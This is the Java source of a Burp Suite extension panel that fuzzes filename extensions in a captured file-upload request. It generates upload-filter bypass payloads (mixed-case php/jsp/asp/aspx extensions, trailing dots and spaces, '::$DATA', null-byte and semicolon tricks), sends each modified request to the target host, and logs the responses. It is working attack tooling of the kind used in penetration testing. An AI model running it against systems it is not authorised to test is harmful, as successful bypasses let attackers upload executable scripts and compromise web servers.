package burp;
import javax.swing.*;
import javax.swing.table.TableModel;
import java.awt.*;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Comparator;
import java.util.List;
import java.util.Vector;
import java.io.PrintWriter;
import javax.swing.table.DefaultTableModel;
import javax.swing.table.TableRowSorter;

import java.util.concurrent.Executors;
import java.util.concurrent.ExecutorService;

import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;


public class AttackPanel extends JTabbedPane{
    IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;
    private String host;
    private int port;
    private boolean https;
    private byte[] content;
    private int[][] fname_pos;
    private int fname_cnt;
    private byte[][][] fname_payloads;

    private JSplitPane splitPane;
    public IMessageEditor requestViewer;
    public IMessageEditor responseViewer;
    private final List<LogEntry> log = new ArrayList<LogEntry>();
    private IHttpRequestResponse currentlyDisplayedItem;

    private int num = 0;
    Vector<Vector<Object>> data = new Vector<Vector<Object>>();
    private Table logTable;
    PrintWriter stdout;

    public AttackPanel(String _host,int _port,boolean _https,byte[] _content,int[][] _pos,int _pos_cnt,IBurpExtenderCallbacks cb) {

        callbacks = cb;
        helpers = callbacks.getHelpers();
        stdout = new PrintWriter(callbacks.getStdout(), true);
        host = _host;
        port = _port;
        https = _https;
        content = _content;
        fname_pos = _pos;
        fname_cnt = _pos_cnt;
        //sort(fname_pos, new int[] {0,1});
        initComponents();
        gen_payloads();
    }

    private void initComponents() {
        splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        Vector<String> col_name = new Vector<String>();
        col_name.add("Request");
        col_name.add("Payload");
        col_name.add("Status");
        col_name.add("Error");
        col_name.add("Timeout");
        col_name.add("Length");

        DefaultTableModel model = new DefaultTableModel(data, col_name){
            public boolean isCellEditable(int row, int column)
            {
                return false;
            }
            @Override
            public Class<?> getColumnClass(int col) {
                if(col == 3 || col==4){
                    return Boolean.class;
                }
                return super.getColumnClass(col);
            }
        };
        logTable = new Table(model);
        TableRowSorter sorter = new TableRowSorter(model);

        logTable.setRowSorter(sorter);
        logTable.setSelectionBackground(new Color(255,197,153));
        logTable.getSelectionModel().setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        logTable.setColumnSelectionAllowed(false);
        logTable.setRowSelectionAllowed(true);
        //logTable.setBackground(Color.WHITE);
        JCheckBox jc1 = new JCheckBox();
        JCheckBox jc2 = new JCheckBox();
        logTable.getColumnModel().getColumn(3).setCellEditor(new DefaultCellEditor(jc1));
        logTable.getColumnModel().getColumn(4).setCellEditor(new DefaultCellEditor(jc2));
        JScrollPane scrollPane = new JScrollPane(logTable);
        scrollPane.setPreferredSize(new Dimension(0,200));
        splitPane.setLeftComponent(scrollPane);

        JTabbedPane tabs = new JTabbedPane();
        requestViewer = callbacks.createMessageEditor(null,false);
        responseViewer = callbacks.createMessageEditor(null,false);
        tabs.addTab("Request", requestViewer.getComponent());
        tabs.addTab("Response", responseViewer.getComponent());
        splitPane.setRightComponent(tabs);


        this.add(splitPane,"Result");
        JPanel target = new JPanel();
        this.add(target,"Target");
        JPanel positions = new JPanel();
        this.add(positions,"Positions");
    }

    public static void sort(int[][] ob, final int[] order) {
        Arrays.sort(ob, new Comparator<Object>() {
            public int compare(Object o1, Object o2) {
                int[] one = (int[]) o1;
                int[] two = (int[]) o2;
                for (int i = 0; i < order.length; i++) {
                    int k = order[i];
                    if (one[k] > two[k]) {
                        return 1;
                    } else if (one[k] < two[k]) {
                        return -1;
                    } else {
                        continue;
                    }
                }
                return 0;
            }
        });
    }

    public static byte[] Replace(byte[] source, int[] _pos, byte[] s){
        byte[] target = new byte[source.length-(_pos[1]-_pos[0])+s.length];
        for(int i = 0,j=0; i < source.length; i++){
            if( i==_pos[0]){
                System.arraycopy(s,0,target,i,s.length);
                i += _pos[1]-_pos[0]-1;
                j += s.length;
            }
            else{
                target[j++] = source[i];
            }
        }
        return target;
    }

    public void start()
    {
        Timer timer = new Timer(500, new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                logTable.updateUI();
            }
        });
        timer.setRepeats(true);//如果这里不设定，timer中的listener只执行一次
        timer.start();

        ExecutorService pool = Executors.newFixedThreadPool(5);
        int k = 0;
        for(int i=0;i<fname_cnt;i++){
            for(int j=0;j<fname_payloads[i].length;j++){
                Thread th = new Thread(new Attacker(i,j,k++));
                pool.execute(th);
            }
        }
        pool.shutdown();
        timer.stop();
    }

    public static byte[] subBytes(byte[] src, int begin, int count) {
        byte[] bs = new byte[count];
        System.arraycopy(src, begin, bs, 0, count);
        return bs;
    }

    private void gen_payloads()
    {
        String[] suffix = new String[100];
        for(int i=0;i<fname_cnt;i++) {
            suffix[i] = helpers.bytesToString(subBytes(content, fname_pos[i][0] + 1, fname_pos[i][1] - fname_pos[i][0] - 2));
        }
        String[] exts = {"php","PhP","jsp","JsP","asp","AsP","aspx","AsPx","html","HtmL"};
        fname_payloads = new byte[fname_cnt][81][];
        for(int i=0;i<fname_cnt;i++) {
            int k = 0;
            fname_payloads[i][k++] = helpers.stringToBytes(suffix[i]);
            for (int j = 0; j < exts.length; j++) {
                fname_payloads[i][k++] = helpers.stringToBytes(exts[j]);
                fname_payloads[i][k++] = helpers.stringToBytes(exts[j] + ".");
                fname_payloads[i][k++] = helpers.stringToBytes(exts[j] + " ");
                fname_payloads[i][k++] = helpers.stringToBytes(exts[j] + "::$DATA");
                fname_payloads[i][k++] = helpers.stringToBytes(exts[j] + "/.");
                fname_payloads[i][k++] = helpers.stringToBytes(exts[j] + (char) 0 + "." + suffix[i]);
                fname_payloads[i][k++] = helpers.stringToBytes(exts[j] + ";a." + suffix[i]);
                fname_payloads[i][k++] = helpers.stringToBytes(exts[j] + "/a." + suffix[i]);
            }
        }
    }

    private class Table extends JTable
    {
        public Table(TableModel tableModel)
        {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend)
        {
            int index = Integer.parseInt(getValueAt(row,0).toString());
            for(int i = 0;i < log.size(); i ++){
                if(log.get(i).index==index) {
                    index=i;
                    break;
                }
            }
            LogEntry logEntry = log.get(index);
            requestViewer.setMessage(logEntry.request, true);
            responseViewer.setMessage(logEntry.response, false);

            super.changeSelection(row, col, toggle, extend);
        }
    }

    private static class LogEntry
    {
        final int index;
        final String payload;
        final int status;
        final boolean error;
        final boolean timeout;
        final int length;
        final byte[] request;
        final byte[] response;

        LogEntry(int index, String payload, int status,boolean error,boolean timeout,int length,byte[] request,byte[] response)
        {
            this.index = index;
            this.payload = payload;
            this.status = status;
            this.error = error;
            this.timeout = timeout;
            this.length = length;
            this.request = request;
            this.response = response;
        }
    }
    class Attacker implements Runnable {
        private int index;
        private int pos_index;
        private int payload_index;
        public Attacker(int _pos_index,int _payload_index,int _index){
            pos_index = _pos_index;
            payload_index = _payload_index;
            index = _index;
        }
        public void run() {
            byte[] req = Replace(content,fname_pos[pos_index],fname_payloads[pos_index][payload_index]);
            int diff = fname_payloads[pos_index][payload_index].length-(fname_pos[pos_index][1]-fname_pos[pos_index][0]);
            stdout.print(diff);
            for(int i=0;i<fname_cnt;i++){
                if(i<pos_index) {
                    req = Replace(req, fname_pos[i], fname_payloads[i][0]);
                }
                else if(i>pos_index){
                    int[] pos = new int[2];
                    pos[0] = fname_pos[i][0]+diff;
                    pos[1] = fname_pos[i][1]+diff;
                    req = Replace(req, pos, fname_payloads[i][0]);
                }
            }
            byte[] response = callbacks.makeHttpRequest(host, port, https, req);
            Vector row = new Vector();
            row.add(index);
            row.add(helpers.bytesToString(fname_payloads[pos_index][payload_index]));
            row.add(200);
            row.add(false);
            row.add(false);
            row.add(response.length);
            data.add(row);
            log.add(new LogEntry (index, "payload",200,false,false,response.length,req,response));
        }
    }
}